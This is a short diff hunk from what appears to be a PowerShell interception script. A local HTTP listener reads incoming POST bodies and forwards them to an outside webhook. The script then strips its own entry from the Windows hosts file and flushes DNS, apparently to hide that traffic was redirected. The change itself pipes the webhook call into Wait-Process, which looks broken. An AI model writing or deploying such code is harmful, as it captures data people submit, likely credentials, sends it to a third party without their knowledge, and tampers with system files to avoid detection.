@@ -27,9 +27,9 @@ while ($http.IsListening) {
     if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
         $data = @{
             content = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
-        };
+        } | ConvertTo-Json;
         
-        $response = Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body ($data | ConvertTo-Json);
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body $data | Wait-Process;
 
         (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
         ipconfig /flushdns;
